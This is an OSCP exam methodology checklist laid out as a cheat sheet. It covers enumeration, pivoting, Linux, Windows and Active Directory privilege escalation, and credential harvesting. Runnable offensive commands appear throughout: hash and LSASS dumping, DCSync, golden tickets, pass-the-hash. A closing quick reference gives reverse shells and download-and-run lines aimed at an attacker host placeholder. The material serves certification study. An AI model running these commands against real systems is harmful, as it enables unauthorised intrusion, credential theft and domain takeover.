# R.A.N.C.H. — OSCP Methodology Checklist

**Recon · Attack Surface · Navigate · Compromise · Harvest**
*by Aaron "The Husky Hacker" Gaddis*

> *"Saddle up boys. We're headed for the brick wall."*

---

## R — RECON

### Port Scanning

- [ ] **R01** — Quick TCP scan (top 1000)
  ```bash
  nmap -sC -sV -oN nmap/initial $TARGET
  ```
- [ ] **R02** — Full TCP port scan
  ```bash
  nmap -p- --min-rate 5000 -oN nmap/alltcp $TARGET
  ```
- [ ] **R03** — Targeted scan on discovered ports
  ```bash
  nmap -p <PORTS> -sC -sV -oN nmap/targeted $TARGET
  ```
- [ ] **R04** — UDP scan (top 50)
  ```bash
  sudo nmap -sU --top-ports 50 --min-rate 5000 -oN nmap/udp $TARGET
  ```
- [ ] **R05** — SNMP check (161/162)
  ```bash
  snmpwalk -v2c -c public $TARGET | tee snmp_output.txt
  ```

### Service Enumeration

- [ ] **R06** — FTP (21) — anonymous login / version
  ```bash
  ftp $TARGET  # try anonymous:anonymous
  ```
- [ ] **R07** — SSH (22) — banner grab / version
  ```bash
  ssh -v $TARGET 2>&1 | head -5
  ```
- [ ] **R08** — SMTP (25) — user enum VRFY/EXPN
  ```bash
  smtp-user-enum -M VRFY -U users.txt -t $TARGET
  ```
- [ ] **R09** — DNS (53) — zone transfer
  ```bash
  dig axfr @$TARGET <DOMAIN>
  ```
- [ ] **R10** — HTTP(S) (80/443/8080) — whatweb / headers
  ```bash
  whatweb $TARGET && curl -I http://$TARGET
  ```
- [ ] **R11** — SMB (445) — null session / shares
  ```bash
  smbclient -L //$TARGET -N && crackmapexec smb $TARGET -u '' -p '' --shares
  ```
- [ ] **R12** — RPC (111/135) — rpcclient null
  ```bash
  rpcclient -U '' -N $TARGET -c 'enumdomusers'
  ```
- [ ] **R13** — LDAP (389/636) — anonymous bind
  ```bash
  ldapsearch -x -H ldap://$TARGET -b '' -s base namingContexts
  ```
- [ ] **R14** — Kerberos (88) — kerbrute user enum
  ```bash
  kerbrute userenum -d <DOMAIN> --dc $TARGET users.txt
  ```
- [ ] **R15** — NFS (2049) — showmount
  ```bash
  showmount -e $TARGET
  ```
- [ ] **R16** — MSSQL (1433) — test creds
  ```bash
  impacket-mssqlclient <USER>:<PASS>@$TARGET -windows-auth
  ```
- [ ] **R17** — MySQL (3306) — test creds
  ```bash
  mysql -h $TARGET -u root -p
  ```
- [ ] **R18** — RDP (3389) — verify open
  ```bash
  xfreerdp /v:$TARGET /u:<USER> /p:<PASS> +clipboard /cert:ignore
  ```
- [ ] **R19** — WinRM (5985/5986) — test
  ```bash
  evil-winrm -i $TARGET -u <USER> -p <PASS>
  ```

---

## A — ATTACK SURFACE

### Web Enumeration

- [ ] **A01** — Directory brute force
  ```bash
  feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o dirs.txt
  ```
- [ ] **A02** — File brute force (php/txt/html/aspx/jsp)
  ```bash
  feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,html,aspx,jsp
  ```
- [ ] **A03** — Vhost / subdomain enumeration
  ```bash
  ffuf -u http://$TARGET -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>
  ```
- [ ] **A04** — Nikto scan
  ```bash
  nikto -h http://$TARGET -o nikto.txt
  ```
- [ ] **A05** — View page source / comments
  ```bash
  curl -s http://$TARGET | grep -iE '<!--|TODO|FIXME|password|user|key|token|api|secret'
  ```
- [ ] **A06** — robots.txt / sitemap.xml
  ```bash
  curl -s http://$TARGET/robots.txt; curl -s http://$TARGET/sitemap.xml
  ```
- [ ] **A07** — Check for .git / .env / backup files
  ```bash
  curl -s http://$TARGET/.git/HEAD; curl -s http://$TARGET/.env
  ```
- [ ] **A08** — CMS identification (WordPress/Joomla/Drupal)
  ```bash
  wpscan --url http://$TARGET -e ap,at,u --api-token <TOKEN>
  ```
- [ ] **A09** — API endpoint discovery
  ```bash
  feroxbuster -u http://$TARGET/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
  ```
- [ ] **A10** — Parameter fuzzing (GET/POST)
  ```bash
  ffuf -u 'http://$TARGET/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <SIZE>
  ```

### Credential Gathering

- [ ] **A11** — Default credentials check
  ```
  Check cirt.net/passwords, default-password.info
  ```
- [ ] **A12** — CeWL custom wordlist from site
  ```bash
  cewl http://$TARGET -m 5 -d 3 -w cewl_wordlist.txt
  ```
- [ ] **A13** — Username list from team/about pages
  ```
  firstname.lastname, f.lastname, first.l patterns
  ```
- [ ] **A14** — Hydra brute force (SSH/FTP/HTTP)
  ```bash
  hydra -L users.txt -P passwords.txt $TARGET ssh -t 4
  ```
- [ ] **A15** — AS-REP Roasting (no pre-auth)
  ```bash
  impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip $TARGET -no-pass
  ```
- [ ] **A16** — Password spraying (AD)
  ```bash
  crackmapexec smb $TARGET -u users.txt -p '<PASSWORD>' --continue-on-success
  ```

### Vulnerability Identification

- [ ] **A17** — Searchsploit version check
  ```bash
  searchsploit <SERVICE> <VERSION>
  ```
- [ ] **A18** — Google CVE search for versions
  ```
  'software version exploit CVE'
  ```
- [ ] **A19** — Check exploit-db / GitHub PoCs
  ```
  github.com/search CVE-XXXX-XXXXX
  ```
- [ ] **A20** — SQLi testing (manual + sqlmap)
  ```bash
  sqlmap -u 'http://$TARGET/page?id=1' --batch --dbs
  ```
- [ ] **A21** — File upload bypass testing
  ```
  Extension matrix: php/phtml/php5/phar, magic bytes, Content-Type spoof
  ```
- [ ] **A22** — LFI/RFI testing
  ```bash
  curl 'http://$TARGET/page?file=../../../etc/passwd'
  ```
- [ ] **A23** — SSTI testing
  ```
  Inject {{7*7}} or ${7*7} in input fields
  ```
- [ ] **A24** — Command injection testing
  ```
  ; | $() `` && || in params
  ```

---

## N — NAVIGATE (Pivoting & Lateral Movement)

### Pivoting

- [ ] **N01** — Ligolo-ng proxy setup
  ```bash
  # Attacker: ./proxy -selfcert
  # Agent:    ./agent -connect <ATTACKER>:11601 -ignore-cert
  ```
- [ ] **N02** — Add tunnel interface + route
  ```bash
  # interface_add, start, ip route add <SUBNET>/24 dev ligolo
  ```
- [ ] **N03** — Chisel SOCKS proxy
  ```bash
  # Server: chisel server -p 8080 --reverse
  # Client: chisel client <ATK>:8080 R:socks
  ```
- [ ] **N04** — SSH dynamic port forward
  ```bash
  ssh -D 1080 -N user@$TARGET  # then proxychains
  ```
- [ ] **N05** — SSH local port forward
  ```bash
  ssh -L <LOCAL>:127.0.0.1:<REMOTE> user@$TARGET
  ```

### Lateral Movement (AD)

- [ ] **N06** — Pass-the-Hash
  ```bash
  impacket-psexec <DOMAIN>/Administrator@$TARGET -hashes :<NTLM>
  ```
- [ ] **N07** — Evil-WinRM with hash
  ```bash
  evil-winrm -i $TARGET -u Administrator -H <NTLM>
  ```
- [ ] **N08** — RDP with creds
  ```bash
  xfreerdp /v:$TARGET /u:<USER> /p:<PASS> /cert:ignore /drive:share,/tmp
  ```
- [ ] **N09** — WMI exec
  ```bash
  impacket-wmiexec <DOMAIN>/<USER>:<PASS>@$TARGET
  ```
- [ ] **N10** — PsExec
  ```bash
  impacket-psexec <DOMAIN>/<USER>:<PASS>@$TARGET
  ```
- [ ] **N11** — Internal network scan from pivot
  ```bash
  for i in $(seq 1 254); do (ping -c 1 172.16.X.$i | grep 'bytes from' &); done
  ```
- [ ] **N12** — Port scan from pivot
  ```bash
  proxychains nmap -sT -Pn --top-ports 100 <INTERNAL_TARGET>
  ```

---

## C — COMPROMISE: Linux Privesc

### Quick Wins

- [ ] **CL01** — sudo -l (NOPASSWD / GTFOBins)
  ```bash
  sudo -l  # check gtfobins.github.io
  ```
- [ ] **CL02** — SUID / SGID binaries
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
- [ ] **CL03** — Writable /etc/passwd
  ```bash
  ls -la /etc/passwd /etc/shadow
  ```
- [ ] **CL04** — Kernel exploits (uname -a)
  ```bash
  uname -a && cat /etc/os-release
  ```
- [ ] **CL05** — PwnKit CVE-2021-4034
  ```
  Python one-liner or compiled binary
  ```
- [ ] **CL06** — DirtyPipe CVE-2022-0847 (5.8–5.16)
  ```
  Kernel version check first
  ```

### Credential Hunting

- [ ] **CL07** — Config files with passwords
  ```bash
  grep -rli 'password\|passwd\|secret\|key\|token' /var/www/ /opt/ /etc/ 2>/dev/null
  ```
- [ ] **CL08** — Database config files
  ```bash
  find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.env' 2>/dev/null | xargs grep -li 'pass' 2>/dev/null
  ```
- [ ] **CL09** — SSH keys
  ```bash
  find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null
  ```
- [ ] **CL10** — History files
  ```bash
  cat ~/.bash_history ~/.mysql_history ~/.python_history 2>/dev/null
  ```
- [ ] **CL11** — Process / environment variables
  ```bash
  ps auxwwe | grep -i pass; env
  ```

### Cron & Scheduled Tasks

- [ ] **CL12** — Cron jobs
  ```bash
  cat /etc/crontab; ls -la /etc/cron.*; crontab -l
  ```
- [ ] **CL13** — Systemd timers
  ```bash
  systemctl list-timers --all
  ```
- [ ] **CL14** — Writable cron scripts
  ```
  Check if any cron script or its sourced config is writable
  ```
- [ ] **CL15** — Tar wildcard injection
  ```
  If cron uses tar with * in a writable dir: --checkpoint + --checkpoint-action
  ```
- [ ] **CL16** — Writable sourced config files
  ```
  Scripts that source a writable .conf → inject commands
  ```

### Path & Library Hijacking

- [ ] **CL17** — PATH hijack in SUID/sudo
  ```bash
  # If binary calls command without full path:
  export PATH=/tmp:$PATH
  ```
- [ ] **CL18** — Shared library hijack (RPATH/LD_PRELOAD)
  ```bash
  readelf -d /path/to/binary | grep RPATH; ldd /path/to/binary
  ```
- [ ] **CL19** — Python module hijack
  ```
  Writable dir in sys.path before legit module → replace module
  ```
- [ ] **CL20** — Writable service binary
  ```bash
  systemctl show <service> | grep ExecStart  # → replace binary
  ```

### Container / NFS / Misc

- [ ] **CL21** — Docker group abuse
  ```bash
  id | grep docker && docker run -v /:/mnt --rm -it alpine chroot /mnt bash
  ```
- [ ] **CL22** — NFS no_root_squash
  ```bash
  showmount -e $TARGET; mount -t nfs $TARGET:/share /mnt
  ```
- [ ] **CL23** — Capabilities
  ```bash
  getcap -r / 2>/dev/null
  ```
- [ ] **CL24** — Automated enumeration
  ```bash
  # linpeas.sh / husky-privesc
  ```

### Linux Shell Stabilization

- [ ] **CL25** — Upgrade shell
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  # then Ctrl+Z, stty raw -echo; fg
  ```

---

## C — COMPROMISE: Windows Privesc

### Quick Wins

- [ ] **CW01** — whoami /priv — token privileges
  ```cmd
  whoami /priv  # SeImpersonate → Potato
  ```
- [ ] **CW02** — GodPotato / SigmaPotato / PrintSpoofer
  ```cmd
  GodPotato.exe -cmd 'cmd /c whoami'
  ```
- [ ] **CW03** — Unquoted service paths
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows"
  ```
- [ ] **CW04** — Writable service binaries
  ```cmd
  icacls <SERVICE_BINARY_PATH>
  ```
- [ ] **CW05** — Service binary path hijack (sc config)
  ```cmd
  sc config <SVC> binpath= 'cmd /c C:\Temp\rev.exe'
  ```
- [ ] **CW06** — AlwaysInstallElevated
  ```cmd
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
- [ ] **CW07** — SeTcbPrivilege abuse
  ```cmd
  TcbElevation.exe <ServiceName> <cmd>
  ```

### Credential Hunting

- [ ] **CW08** — Mimikatz (from admin shell)
  ```cmd
  mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'
  ```
- [ ] **CW09** — SAM dump
  ```cmd
  reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM sys.bak
  # impacket-secretsdump -sam -system
  ```
- [ ] **CW10** — LSASS dump
  ```
  Task Manager → lsass.exe → Create dump file → pypykatz
  ```
- [ ] **CW11** — LaZagne (all passwords)
  ```cmd
  lazagne.exe all
  ```
- [ ] **CW12** — Saved RDP / browser credentials
  ```cmd
  cmdkey /list
  ```
- [ ] **CW13** — Sticky Notes (plum.sqlite)
  ```
  AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite
  ```
- [ ] **CW14** — KeePass database files
  ```cmd
  dir /s /b *.kdb *.kdbx
  # keepass2john → hashcat/john
  ```
- [ ] **CW15** — IIS web.config
  ```cmd
  type C:\inetpub\wwwroot\web.config
  ```
- [ ] **CW16** — PowerShell history
  ```cmd
  type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  ```
- [ ] **CW17** — Sublime Text sessions
  ```
  AppData\Roaming\Sublime Text\Local\Session.sublime_session
  ```
- [ ] **CW18** — XAMPP config files
  ```cmd
  type C:\xampp\passwords.txt; type C:\xampp\htdocs\*\config*
  ```
- [ ] **CW19** — Thunderbird emails (prefs.js)
  ```
  AppData\Roaming\Thunderbird\Profiles\*.default-release
  ```
- [ ] **CW20** — GPP cPassword (SYSVOL)
  ```
  gpp-decrypt or Get-GPPPassword
  ```

### Service Exploits

- [ ] **CW21** — Argus DVR directory traversal
  ```
  EDB-45296 + weak password decrypt EDB-50130
  ```
- [ ] **CW22** — RemoteMouse RCE
  ```
  EDB-50047 / CVE-2021-35448
  ```
- [ ] **CW23** — XAMPP privilege escalation
  ```
  CVE-2020-11107 — Editor path hijack in xampp-control.ini
  ```

### Automated Enumeration

- [ ] **CW24** — WinPEAS / husky-privesc
  ```cmd
  winPEASx64.exe  # or husky-privesc.ps1
  ```
- [ ] **CW25** — PowerUp.ps1
  ```powershell
  Import-Module .\PowerUp.ps1; Invoke-AllChecks
  ```
- [ ] **CW26** — Seatbelt
  ```cmd
  .\Seatbelt.exe -group=all
  ```

---

## C — COMPROMISE: Active Directory

### Enumeration

- [ ] **CA01** — BloodHound collection
  ```bash
  bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -c all -ns $TARGET
  ```
- [ ] **CA02** — BloodHound — shortest path to DA
  ```
  Shortest Paths to Domain Admins from Owned Principals
  ```
- [ ] **CA03** — LDAP enum (ldapdomaindump)
  ```bash
  ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' ldap://$TARGET
  ```
- [ ] **CA04** — AD users / groups
  ```bash
  crackmapexec smb $TARGET -u <USER> -p <PASS> --users
  ```
- [ ] **CA05** — GPO enumeration
  ```bash
  crackmapexec smb $TARGET -u <USER> -p <PASS> -M gpp_password
  ```
- [ ] **CA06** — husky-ad full scan
  ```bash
  ./husky-ad.sh -d <DOMAIN> -u <USER> -p <PASS> --dc $TARGET --full
  ```

### Credential Attacks

- [ ] **CA07** — Kerberoasting
  ```bash
  impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip $TARGET -request
  ```
- [ ] **CA08** — AS-REP Roasting
  ```bash
  impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip $TARGET -no-pass
  ```
- [ ] **CA09** — Password spraying
  ```bash
  crackmapexec smb $TARGET -u users.txt -p '<PASS>' --continue-on-success
  ```
- [ ] **CA10** — Targeted Kerberoast (set SPN)
  ```
  GenericWrite on user → set SPN → roast → crack → remove SPN
  ```
- [ ] **CA11** — Shadow Credentials
  ```
  GenericWrite → pywhisker / certipy shadow auto
  ```
- [ ] **CA12** — GMSA password read
  ```
  ReadGMSAPassword → gMSADumper.py or bloodyAD
  ```

### ACL Abuse Chains

- [ ] **CA13** — ForceChangePassword
  ```bash
  bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host $TARGET set password <VICTIM> '<NEWPASS>'
  ```
- [ ] **CA14** — GenericAll / GenericWrite
  ```
  Full control → reset password, set SPN, add to group
  ```
- [ ] **CA15** — WriteDACL
  ```
  Grant yourself DCSync rights via DACL modification
  ```
- [ ] **CA16** — WriteOwner
  ```
  Take ownership → WriteDACL → full control
  ```
- [ ] **CA17** — AddMember
  ```
  Add user to privileged group
  ```

### Domain Compromise

- [ ] **CA18** — DCSync
  ```bash
  impacket-secretsdump <DOMAIN>/<USER>:<PASS>@$TARGET -just-dc
  ```
- [ ] **CA19** — Pass-the-Hash → DC
  ```bash
  impacket-psexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM>
  ```
- [ ] **CA20** — NTDS.dit dump
  ```bash
  impacket-secretsdump <DOMAIN>/Administrator@$TARGET -hashes :<NTLM> -just-dc-ntlm
  ```
- [ ] **CA21** — Golden Ticket
  ```bash
  impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator
  ```
- [ ] **CA22** — Constrained Delegation abuse
  ```bash
  impacket-getST -spn <SPN> -impersonate Administrator <DOMAIN>/<USER> -hashes :<NTLM>
  ```

### AD CS (Certificate Abuse)

- [ ] **CA23** — Enumerate ADCS templates
  ```bash
  certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip $TARGET
  ```
- [ ] **CA24** — ESC1 — Enrollee supplies subject
  ```bash
  certipy req -u <USER>@<DOMAIN> -p '<PASS>' -ca <CA> -template <VULN_TPL> -upn Administrator@<DOMAIN>
  ```
- [ ] **CA25** — ESC4 → ESC1 chain
  ```
  Modify vulnerable template → make it ESC1 → request admin cert
  ```

### Coercion & Relay

- [ ] **CA26** — Coerced auth (PetitPotam/PrinterBug)
  ```bash
  python3 PetitPotam.py <LISTENER> $TARGET
  ```
- [ ] **CA27** — NTLM relay (Inveigh/Responder)
  ```bash
  sudo responder -I <IFACE> -dwP
  ```
- [ ] **CA28** — MSSQL xp_cmdshell
  ```
  IMPERSONATE sa → EXEC sp_configure 'xp_cmdshell',1 → xp_cmdshell 'cmd'
  ```

---

## H — HARVEST (Loot & Proof)

### Flags & Screenshots

- [ ] **H01** — Capture local.txt / user.txt
  ```bash
  cat /home/*/local.txt /home/*/user.txt 2>/dev/null
  # Windows: type C:\Users\*\Desktop\local.txt
  ```
- [ ] **H02** — Capture proof.txt / root.txt
  ```bash
  cat /root/proof.txt 2>/dev/null
  # Windows: type C:\Users\Administrator\Desktop\proof.txt
  ```
- [ ] **H03** — Screenshot with IP proof
  ```
  hostname && whoami && ifconfig/ipconfig && cat flag
  ```
- [ ] **H04** — Record steps in notes
  ```
  Document exact exploit, commands, and creds used
  ```

### Post-Exploitation

- [ ] **H05** — Dump all hashes (Mimikatz/secretsdump)
  ```bash
  impacket-secretsdump <DOMAIN>/<USER>:<PASS>@$TARGET
  ```
- [ ] **H06** — Check for pivot opportunities
  ```
  arp -a, netstat, route, internal subnets
  ```
- [ ] **H07** — Credential reuse on other targets
  ```bash
  crackmapexec smb <TARGETS> -u <USER> -p <PASS>
  ```
- [ ] **H08** — Look for dual-homed hosts
  ```
  ifconfig / ipconfig /all — multiple NICs = pivot point
  ```

---

## Exam Day Reminders

### Time Management (23:45 hours)

- AD set FIRST — 40 points, spend up to 8 hours
- Then standalones — 20 pts each, 3–4 hours each
- Minimum to pass: 70 pts (AD set + 1.5 standalones)
- Take breaks every 2 hours — walk, eat, hydrate

### Passing Scenarios

| Scenario | Points | Result |
|----------|--------|--------|
| AD (40) + 2 full standalones (40) | 80 | ✅ Pass |
| AD (40) + 1 full (20) + 1 user-only (10) | 70 | ✅ Pass |
| 3 full standalones (60) + AD partial | ??? | ⚠️ Risky |

### If You're Stuck

- Re-read nmap output — missed port?
- Re-run enum with different wordlists
- Check for default creds on every service
- Try credential reuse across all services
- Google exact version + "exploit" or "CVE"
- Check GTFOBins / LOLBAS for sudo/SUID
- Enumerate INTERNAL services (`ss -tlnp` / `netstat`)
- Enumerate the FILESYSTEM — config files, backups, history
- Re-read the box name/theme — it's often a hint

### Listener Setup (keep running)

```bash
# Terminal 1
nc -lvnp 443

# Terminal 2
nc -lvnp 4444

# Terminal 3
python3 -m http.server 80
```

### File Transfer Cheat Sheet

| Direction | Command |
|-----------|---------|
| Linux → Attacker | `curl http://<ATK>/linpeas.sh \| bash` |
| Win → Attacker | `certutil -urlcache -f http://<ATK>/nc.exe C:\Temp\nc.exe` |
| Win (PS) | `iwr -uri http://<ATK>/file -outfile C:\Temp\file` |
| SMB share | `impacket-smbserver share . -smb2support` |

### Reverse Shell Quick Ref

```bash
# Bash
bash -i >& /dev/tcp/<ATK>/443 0>&1

# Python
python3 -c 'import socket,subprocess,os;...'

# PowerShell
IEX(New-Object Net.WebClient).DownloadString('http://<ATK>/rev.ps1')

# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATK> LPORT=443 -f exe -o rev.exe
```

---

*Stay sharp. You got this, Husky. 🐺*
